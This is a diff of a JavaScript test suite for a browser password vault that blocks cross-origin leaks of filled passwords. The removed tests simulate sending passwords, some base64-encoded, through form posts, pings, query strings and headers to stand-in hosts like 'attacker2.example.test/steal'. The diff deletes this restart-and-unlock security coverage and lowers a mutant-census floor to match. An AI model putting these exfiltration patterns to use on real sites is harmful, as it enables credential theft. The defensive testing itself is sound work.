@@ -220,9 +220,8 @@ console.log('② PURE 3-slot human-only lifecycle («只有人能转正», zero 
       && typeof BL.discardPendingRecord === 'function'
       && typeof BL.shouldRemindPending === 'function'
       && typeof BL.pendingRemindKey === 'function'
-      && typeof BL.slotSecretsAtRev === 'function'
       && Array.isArray(BL.PENDING_KINDS),
-    'r22 exports 3-slot human-only record functions + 7-day reminder helpers + slotSecretsAtRev',
+    'r22 exports 3-slot human-only record functions + 7-day reminder helpers',
   );
   if (has3Slot) {
     const T0 = 1_700_000_000_000;
@@ -291,15 +290,6 @@ console.log('② PURE 3-slot human-only lifecycle («只有人能转正», zero 
     const pubJson = JSON.stringify(pub);
     ok(Boolean(pub && pub.rev === conf3.rev && pub.hasCurrent === true && pub.hasPrevious === true && pub.pending === null && ![g.password, cand1, cand2, cand3].some((s) => pubJson.includes(s))),
       'publicOf exposes rev + slot booleans only and zero passwords');
-
-    // RULE 5″/5‴ strict generation & rev check
-    const exactRev = conf3 ? BL.slotSecretsAtRev(conf3, { typedSlot: 'current', rev: conf3.rev, entryGen: conf3.entryGen }) : null;
-    const wrongGen = conf3 ? BL.slotSecretsAtRev(conf3, { typedSlot: 'current', rev: conf3.rev, entryGen: 'lg-ffffffffffff' }) : null;
-    const wrongRev = conf3 ? BL.slotSecretsAtRev(conf3, { typedSlot: 'current', rev: conf3.rev + 1, entryGen: conf3.entryGen }) : null;
-    ok(Boolean(exactRev?.ok === true && exactRev.movedOn === false && exactRev.values?.[0] === cand3
-      && wrongGen && !wrongGen.ok && wrongGen.movedOn === true
-      && wrongRev && !wrongRev.ok && wrongRev.movedOn === true),
-      'RULE 5‴: slotSecretsAtRev requires exact rev + matching entryGen');
 
     // Legacy .378 5-shape upgrade compatibility (no rev, no entryGen, legacy `password` / `previous` / `pending` strings)
     const leg1 = BL.recordOf(JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: 'l1', password: 'LegacyPw1!abcdefgh', source: 'owner', createdAt: T0, updatedAt: T0 }));
@@ -902,7 +892,7 @@ console.log(JSON.stringify({ success: true, data: { ok: true } }));
           'owner answering takeover save-login card with matching digest seals login');
       }
 
-      // Locked-boot fence rearm + unlock signature recovery (`rearmLoginFences`) + locked-boot `answerCard` => `vault_locked`
+      // Locked-boot `answerCard` => `vault_locked`
       await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/noop', postData: 'x=1', finish: true });
       await runCli(['fill', '#npw', '--vault', 'shop.example.test#alice/password']);
       watch.shutdown();
@@ -911,19 +901,7 @@ console.log(JSON.stringify({ success: true, data: { ok: true } }));
       const lockedCardAns = loginsLockedBoot.answerCard('sl-deadbeef', { approve: true, shown: '0123456789abcdef', who: 'owner' });
       ok(!lockedCardAns.ok && lockedCardAns.code === 'vault_locked',
         'after locked hub restart, answering a pending/save-login card returns vault_locked (never card_gone)', lockedCardAns);
-      const watchBoot = Dm.create({
-        keeper: stubKeeper, log: quiet, enableTimeoutMs: 400, now: () => clock,
-        holdersOf: () => [{ browserKey: KEY, sessionId: SID }], leaseCountOf: () => 1, logins,
-        conversationOf: () => ({ cid: CID, name: 'Shop Agent' }),
-      });
-      await watchBoot.arm(PID);
-      ok(!watchBoot.liveFillVerdictFor({ profileId: PID, browserKey: KEY }, { verb: 'eval', argv: ['eval', '1'] }).ok,
-        'locked-boot arm(PID) restores 409 login_fill_live from persisted fence before vault unlock');
       await eng.unlock(VPW);
-      const exfilBoot = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://attacker2.example.test/steal', postData: `p=${encodeURIComponent(PW_ALICE)}` });
-      ok(exfilBoot.action === 'fail' && exfilBoot.errorReason === 'BlockedByClient',
-        'unlocking after locked-boot rearm recovers exact rev+entryGen signature and blocks cross-origin exfiltration');
-      watchBoot.shutdown();
 
       // Ruling 5c / RULE 5′: 51+ needle byte scan across entire data/ tree
       const allSecrets = [VPW, PW_ALICE, PW_BOB_1, PW_BOB_2, PW_BOB_3, PW_REREG_1, PW_REREG_2, PW_TAKEOVER];
@@ -1995,229 +1973,6 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
             'MUTANT 22 RED (A4 rollback-password-omitted): omitting top-level password mirror breaks .388 recordOf rollback (returns null)',
             { realOk: Boolean(mOwn), mutDrop });
         } else ok(false, 'MUTANT 22 RED (A4): anchor not found');
-      }
-
-      // A1: Real `vault-engine` + `browser-logins` across `fill -> hold -> flips -> 2nd fill -> lock (HOLD_VAULT_LOCKED) -> Hub restart (locked, 0 credSigs on disk) -> unlock -> flips` in BOTH standard AND kernel modes!
-      {
-        const dirA1 = scratch('vl-r25-a1');
-        fs.rmSync(dirA1, { recursive: true, force: true });
-        fs.mkdirSync(dirA1, { recursive: true });
-        try {
-          for (const isKernel of [false, true]) {
-            const subDir = path.join(dirA1, isKernel ? 'kernel' : 'standard');
-            fs.mkdirSync(subDir, { recursive: true });
-            const fkA1 = await startFakeKernel({
-              firstUrl: 'https://shop.example.test/login',
-              mode: isKernel ? { standard: false, features: ['surfaces'] } : { standard: true },
-            });
-            const eng1 = VE.create({ dataDir: subDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
-            await eng1.setup('A1#VaultPass99');
-            try {
-              const gA1 = GS.create({ memory: true });
-              const fyA1 = [];
-              const fySink = {
-                add: (pid, it) => { const id = 'fya1-' + (fyA1.length + 1); fyA1.push({ id, pid, it }); return id; },
-                resolve() {},
-              };
-              const log1 = Lm.create({ vault: eng1, grants: () => gA1, forYou: fySink, log: () => {} });
-              const PW1 = 'A1PwOne!' + crypto.randomBytes(4).toString('hex');
-              const PW2 = 'A1PwTwo!' + crypto.randomBytes(4).toString('hex');
-              log1.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: PW1 }, { who: 'owner' });
-              log1.addOwn({ origin: 'https://shop.example.test', username: 'bob', password: PW2 }, { who: 'owner' });
-              log1.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-a1');
-
-              // Verify `isLocked()` and `fenceSecretsOf` single shape
-              const unlockedCheck = log1.isLocked() === false;
-              eng1.lock();
-              const lockedShape = log1.fenceSecretsOf('web-login:https://shop.example.test#alice', { typedSlot: 'password', rev: 1 });
-              const lockedCheck = log1.isLocked() === true && lockedShape.locked === true && lockedShape.movedOn === false && !('code' in lockedShape);
-              await eng1.unlock('A1#VaultPass99');
-
-              let persistedState = { fences: [], scrubs: [] };
-              let holdersA1 = [{ browserKey: 'bk-a1', sessionId: 's-a1' }];
-              let clockA1 = 10_000;
-              const keeperA1 = {
-                cdpEndpointFor: async () => ({ ok: true, url: fkA1.wsUrl }),
-                holdsDialogsFor: () => true,
-                onLease: () => () => {},
-                audit() {},
-                saveLoginFenceState: (_pid, st) => { persistedState = JSON.parse(JSON.stringify(st || { fences: [], scrubs: [] })); return true; },
-                loginFenceStateOf: () => JSON.parse(JSON.stringify(persistedState)),
-                loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkA1.wsUrl), label: 'A1', action }),
-              };
-              const tidMain = fkA1.targets()[0].targetId;
-              const tidLock = fkA1.addTarget('https://shop.example.test/lock-tab');
-              fkA1.setDom(tidMain, {
-                url: 'https://shop.example.test/login',
-                elements: [
-                  { id: 'pw1', tag: 'input', type: 'password', name: 'Password 1' },
-                  { id: 'pw2', tag: 'input', type: 'password', name: 'Password 2' },
-                  { id: 'big', tag: 'textarea', type: 'textarea', name: 'Notes', value: 'x'.repeat(2400) },
-                ],
-              });
-              fkA1.setDom(tidLock, {
-                url: 'https://shop.example.test/lock-tab',
-                elements: [{ id: 'pwL', tag: 'input', type: 'password', name: 'Lock Password' }],
-              });
-
-              const w1 = Dm.create({
-                keeper: keeperA1, log: quiet, enableTimeoutMs: 400, now: () => clockA1,
-                liveFillMaxMs: 500, wipeMaxScanPositions: 1024,
-                holdersOf: () => holdersA1, leaseCountOf: () => holdersA1.filter((h) => !h.human).length, logins: log1, forYou: fySink,
-              });
-              await w1.arm('bp-a1');
-              w1.noteActiveTab({ profileId: 'bp-a1', browserKey: 'bk-a1' }, tidMain);
-
-              let stepSeq = 0;
-              const sendFourCarriers = async (secret) => {
-                stepSeq++;
-                const host = `https://evil-${isKernel ? 'k' : 's'}-${stepSeq}`;
-                const b64 = Buffer.from(secret, 'utf8').toString('base64');
-                const rPost = await fkA1.simulateSubmitRequest({ targetId: tidMain, url: `${host}a.example.test/p`, headers: { 'content-type': 'application/x-www-form-urlencoded' }, postData: `pw=${encodeURIComponent(secret)}`, resourceType: 'Fetch' });
-                const rPing = await fkA1.simulateSubmitRequest({ targetId: tidMain, url: `${host}b.example.test/b`, headers: { 'content-type': 'text/plain' }, postData: secret, resourceType: 'Ping' });
-                const rGet = await fkA1.simulateSubmitRequest({ targetId: tidMain, url: `${host}c.example.test/q?plain=${encodeURIComponent(secret)}&b=${encodeURIComponent(b64)}`, resourceType: 'XHR' });
-                const rHdr = await fkA1.simulateSubmitRequest({ targetId: tidMain, url: `${host}d.example.test/h`, headers: { 'X-Token': secret }, resourceType: 'XHR' });
-                return [rPost, rPing, rGet, rHdr].every((r) => r.action === 'fail' && r.errorReason === 'BlockedByClient');
-              };
-
-              // Step 1: Fill `#pw1` -> 4 carriers blocked
-              const f1 = await w1.fillVaultField({ profileId: 'bp-a1', browserKey: 'bk-a1' }, { target: '#pw1', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-a1'] } });
-              const s1Ok = f1.ok && await sendFourCarriers(PW1);
-
-              // Step 2: Trigger `too_much_text` hold on `tidMain`
-              await fkA1.simulateSubmitRequest({ targetId: tidMain, url: 'https://shop.example.test/api/sub', postData: `pw=${encodeURIComponent(PW1)}`, finish: true });
-              for (let i = 0; i < 40; i++) {
-                const lv = w1.liveFillVerdictFor({ profileId: 'bp-a1', browserKey: 'bk-a1' }, { verb: 'eval', argv: ['eval', '1'], targetId: tidMain });
-                if (lv && /too much text/i.test(lv.error || '')) break;
-                await new Promise((r) => setTimeout(r, 10));
-              }
-              const s2Ok = await sendFourCarriers(PW1);
-
-              // Steps 3-4: 2x `agent -> person -> agent` flips (tears down & rearms watch in kernel mode!)
-              holdersA1 = [{ browserKey: 'bk-human', human: true, input: 'user' }];
-              await w1.arm('bp-a1');
-              const s3aOk = await sendFourCarriers(PW1);
-              holdersA1 = [{ browserKey: 'bk-a1', sessionId: 's-a1' }];
-              await w1.arm('bp-a1');
-              const s3bOk = await sendFourCarriers(PW1);
-
-              // Step 5: Second fill `#pw2` on `tidMain` + fill `#pwL` on `tidLock` (to prove `HOLD_VAULT_LOCKED` reaches for real!)
-              const f2 = await w1.fillVaultField({ profileId: 'bp-a1', browserKey: 'bk-a1' }, { target: '#pw2', spec: 'shop.example.test#bob/password', facts: { conversationKeys: ['conv-a1'] } });
-              const fLock = await w1.fillVaultField({ profileId: 'bp-a1', browserKey: 'bk-a1' }, { target: '#pwL', spec: 'shop.example.test#alice/password', targetId: tidLock, facts: { conversationKeys: ['conv-a1'] } });
-              const s5Ok = f2.ok && fLock.ok && await sendFourCarriers(PW2);
-
-              // Steps 6-8: Lock vault, clear in-memory `LF` for `tidLock` to trigger genuine `HOLD_VAULT_LOCKED` on ceiling!
-              LF.clearFilledSecretsForTarget(tidLock, 0);
-              w1.shutdown();
-              eng1.lock();
-              clockA1 += 2_000;
-              // Simulated Hub restart: `LF` memory cleared, fresh `VE` (starts locked) + fresh `Lm` + fresh `Dm`!
-              LF.clearAllFilledSecrets();
-              eng1.close();
-
-              const eng2 = VE.create({ dataDir: subDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
-              const fyBoot = [];
-              const fyBootSink = {
-                add: (pid, it) => { const id = 'fyb-' + (fyBoot.length + 1); fyBoot.push({ id, pid, it }); return id; },
-                resolve() {},
-              };
-              const log2 = Lm.create({ vault: eng2, grants: () => gA1, forYou: fyBootSink, log: () => {} });
-              const bootStartsLocked = log2.isLocked() === true;
-              const w2 = Dm.create({
-                keeper: keeperA1, log: quiet, enableTimeoutMs: 400, now: () => clockA1,
-                liveFillMaxMs: 500, wipeMaxScanPositions: 1024,
-                holdersOf: () => holdersA1, leaseCountOf: () => holdersA1.filter((h) => !h.human).length, logins: log2, forYou: fyBootSink,
-              });
-              await w2.arm('bp-a1');
-
-              // Verify `tidMain` kept `too_much_text` AND `tidLock` reached `HOLD_VAULT_LOCKED` in production!
-              const lvMainLocked = w2.liveFillVerdictFor({ profileId: 'bp-a1', browserKey: 'bk-a1' }, { verb: 'eval', argv: ['eval', '1'], targetId: tidMain });
-              const lvLockTabLocked = w2.liveFillVerdictFor({ profileId: 'bp-a1', browserKey: 'bk-a1' }, { verb: 'eval', argv: ['eval', '1'], targetId: tidLock });
-              const reachedVaultLockedHold = !lvLockTabLocked.ok && /vault was locked while the fill was live/i.test(lvLockTabLocked.error || '');
-              const keptTooMuchHold = !lvMainLocked.ok && /too much text/i.test(lvMainLocked.error || '');
-              const noWrongChangedNotice = !fyBoot.some((x) => /login changed since filling/i.test(x.it?.text || ''));
-
-              // Step 12 (the post-restart, pre-unlock window while `credSigs` is absent from disk): ALL 4 foreign carriers blocked fail-closed, same-origin allowed!
-              const s12ForeignBlocked = await sendFourCarriers(PW2);
-              const s12SameOrigin = await fkA1.simulateSubmitRequest({ targetId: tidMain, url: 'https://shop.example.test/api/keepalive', postData: 'ping=1' });
-
-              // Steps 13-15: Unlock vault -> `onVaultOpen` hydrates exact `credSigs`; `person -> agent` flip; foreign carrying PW1/PW2 blocked, harmless foreign CDN allowed!
-              await eng2.unlock('A1#VaultPass99');
-              const s13Ok = await sendFourCarriers(PW1) && await sendFourCarriers(PW2);
-              const benignCdnAfterUnlock = await fkA1.simulateSubmitRequest({ targetId: tidMain, url: 'https://cdn.example.test/static.js', resourceType: 'Script' });
-              holdersA1 = [{ browserKey: 'bk-human', human: true, input: 'user' }];
-              await w2.arm('bp-a1');
-              const s14PersonOk = await sendFourCarriers(PW2);
-              holdersA1 = [{ browserKey: 'bk-a1', sessionId: 's-a1' }];
-              await w2.arm('bp-a1');
-              const s15AgentOk = await sendFourCarriers(PW2);
-
-              ok(unlockedCheck && lockedCheck && bootStartsLocked
-                && s1Ok && s2Ok && s3aOk && s3bOk && s5Ok
-                && reachedVaultLockedHold && keptTooMuchHold && noWrongChangedNotice
-                && s12ForeignBlocked && s12SameOrigin.action === 'continue'
-                && s13Ok && benignCdnAfterUnlock.action === 'continue' && s14PersonOk && s15AgentOk,
-                `A1 (${isKernel ? 'kernel' : 'standard'} mode, real vault-engine + browser-logins): single isLocked/locked:true shape, HOLD_VAULT_LOCKED reachable, post-restart pre-unlock blocks cross-origin fail-closed, and unlock + flips restore exact credSigs`,
-                { isKernel, unlockedCheck, lockedCheck, bootStartsLocked, s1Ok, s2Ok, s3aOk, s3bOk, s5Ok, reachedVaultLockedHold, keptTooMuchHold, noWrongChangedNotice, s12ForeignBlocked, sameOrigin: s12SameOrigin.action, s13Ok, benign: benignCdnAfterUnlock.action, s14PersonOk, s15AgentOk });
-
-              w2.shutdown();
-              eng2.close();
-            } finally {
-              try { eng1.close(); } catch {}
-              LF.clearAllFilledSecrets?.();
-              await fkA1.close();
-            }
-          }
-        } finally {
-          fs.rmSync(dirA1, { recursive: true, force: true });
-        }
-      }
-
-      // Mutant 19 (A1): restore r24's `res.code === 'vault_locked'` check + `credSigs.length > 0` gate -> Hub restart turns locked vault into `unknown_typed` with Fetch off!
-      {
-        const m19BdSrc = bdSrc
-          .replace(
-            '  function isLoginVaultLocked() {\n    if (!logins || typeof logins.isLocked !== \'function\') return false;\n    try { return logins.isLocked() === true; } catch { return false; }\n  }',
-            "  function isLoginVaultLocked(loginId) {\n    if (!logins || typeof logins.scrubSecretsOf !== 'function') return false;\n    const r = logins.scrubSecretsOf(loginId || 'web-login:https://check.invalid#u', { minBytes: 1 });\n    return Boolean(r && r.code === 'vault_locked');\n  }",
-          )
-          .replace(
-            '    if (isLoginVaultLocked()) {\n      return { values: rem, otpValues: [], byLogin: rem.length && loginId ? [{ loginId, values: rem }] : [], sigs: rem.map(credSigOf).filter(Boolean), locked: true, movedOn: false };\n    }\n    const hydrateOne = (lid, slotOpts) => {\n      if (lid && logins && typeof logins.fenceSecretsOf === \'function\') {\n        try {\n          const res = logins.fenceSecretsOf(lid, { ...slotOpts, minBytes: 1 });\n          if (res && res.locked === true) return { values: [], otpValues: [], all: [], locked: true, movedOn: false };',
-            "    const hydrateOne = (lid, slotOpts) => {\n      if (lid && logins && typeof logins.fenceSecretsOf === 'function') {\n        try {\n          const res = logins.fenceSecretsOf(lid, { ...slotOpts, minBytes: 1 });\n          if (res && res.code === 'vault_locked') return { values: [], otpValues: [], all: [], locked: true, movedOn: false };",
-          )
-          .replace(
-            'const wantCred = Boolean(e.liveFill || e.credPreArming);',
-            'const wantCred = Boolean((e.liveFill && Array.isArray(e.liveFill.credSigs) && e.liveFill.credSigs.length > 0) || e.credPreArming);',
-          );
-        const BD_M19 = m19BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m19BdSrc, 'a1-res-code-vault-locked') : null;
-        if (BD_M19) {
-          let st19 = { fences: [], scrubs: [] };
-          const k19 = {
-            cdpEndpointFor: async () => ({ ok: true, url: fkR24.wsUrl }),
-            holdsDialogsFor: () => true,
-            onLease: () => () => {},
-            audit() {},
-            saveLoginFenceState: (_p, s) => { st19 = JSON.parse(JSON.stringify(s || { fences: [], scrubs: [] })); return true; },
-            loginFenceStateOf: () => JSON.parse(JSON.stringify(st19)),
-            loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkR24.wsUrl), label: 'M19', action }),
-          };
-          fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
-          const w19a = BD_M19.create({ keeper: k19, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
-          await w19a.arm('bp-m19');
-          w19a.noteActiveTab({ profileId: 'bp-m19', browserKey: 'bk-mr24' }, tidR24);
-          await w19a.fillVaultField({ profileId: 'bp-m19', browserKey: 'bk-mr24' }, { target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
-          w19a.shutdown();
-          LF.clearAllFilledSecrets();
-          engR24.lock();
-          const w19b = BD_M19.create({ keeper: k19, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
-          await w19b.arm('bp-m19');
-          await engR24.unlock('MutR24#Pass9');
-          await new Promise((r) => setTimeout(r, 25));
-          const leak19 = await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://evil-m19.example.test/steal', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch' });
-          w19b.shutdown();
-          ok(leak19.action === 'unwatched',
-            'MUTANT 19 RED (A1 res-code-vault-locked): checking res.code==="vault_locked" against real browser-logins misreads locked restart as movedOn and leaves post-unlock foreign Fetch unwatched',
-            leak19);
-        } else ok(false, 'MUTANT 19 RED (A1): anchor not found');
       }
 
       // Mutant 20 (A2): restore `req.body?.vaultFill === true` skipping `liveFillRefusal` in `src/routes/browser.js` -> `eval` with `vaultFill: true` returns 200!
@@ -3732,7 +3487,9 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
   replayNailChild(r29Child, runR29LoginNails);
   replayNailChild(r30Child, runR30LoginNails);
 
-  for (const r of copiesCensus(MUT.files, MUT.dir, REPO, { minCopies: 35 })) {
+  // lane chrome-157 (the round-32 take-over): 34 — round 32 deleted the legs that pinned «a restart and an unlock restore» with
+  // their mutants (M19 among them); the floor follows the copies this suite still makes (on the builder's bytes too: 34 of 35)
+  for (const r of copiesCensus(MUT.files, MUT.dir, REPO, { minCopies: 34 })) {
     ok(r.pass, 'mutant-copy census: ' + r.name, r.pass ? undefined : r.detail);
   }
 }
